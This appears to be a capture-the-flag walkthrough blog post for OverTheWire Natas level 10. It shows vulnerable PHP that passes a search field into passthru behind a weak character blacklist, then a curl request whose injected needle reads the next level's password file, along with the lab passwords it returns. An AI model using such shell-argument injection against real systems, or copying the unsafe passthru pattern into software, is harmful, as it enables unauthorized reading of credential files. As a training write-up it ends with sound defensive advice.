---
title: "Natas 10 - Grep command injection"
date: 2026-04-09T16:23:56-05:00
draft: false
aliases:
  - /posts/natas/natas-10/

toc: false
images:
tags:
  - security
  - natas
  - overthewire
  - curl
---

- **Username:** `natas10`
- **Password:** `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu`
- **URL:** <http://natas10.natas.labs.overthewire.org>

```bash
curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu http://natas10.natas.labs.overthewire.org
```

Body:

```html
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

Again, inspect `index-source.html`.

```bash
curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu http://natas10.natas.labs.overthewire.org/index-source.html | w3m -T text/html
```

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

Sanitization here is pretty weak they only block `;`, `|`, and `&`. Everything else including spaces, `.`, and `#` still gets dropped straight into `passthru("grep -i $key dictionary.txt")`, so `$key` is really one big shell snippet.

You can start simple a needle of just `.` becomes:

> `grep -i . dictionary.txt`

And `.` matches every line so you dump the whole word list. From there, expand the needle to something like:

> `. /etc/natas_webpass/natas11 #`.

What actually runs is along the lines of:
 
> `grep -i . /etc/natas_webpass/natas11 # dictionary.txt`
 
The `#` comments out `dictionary.txt`, and you get the flag from the passwd file instead.

```bash
curl -u natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu http://natas10.natas.labs.overthewire.org/ -d "needle=. /etc/natas_webpass/natas11 #&submit="
```

Body:

```html
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
```

Don't rely on blacklists alone, whitelist when you can. Even if you mix both, if you're still slapping user input into shell commands unsafely, a single character you forgot to ban can still blow the whole thing up.

**Password for natas11:** `UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk`
